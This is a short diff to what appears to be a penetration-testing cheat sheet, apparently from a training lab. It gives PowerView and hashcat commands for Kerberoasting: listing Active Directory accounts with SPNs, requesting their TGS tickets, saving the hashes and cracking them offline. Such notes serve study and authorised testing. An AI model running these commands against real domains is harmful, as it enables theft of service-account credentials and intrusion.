@@ -2040,7 +2040,7 @@ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname
 
 # PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
-Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Select-Object -ExpandProperty Hash > sqldev_hash.txt
 
 # Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host.
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
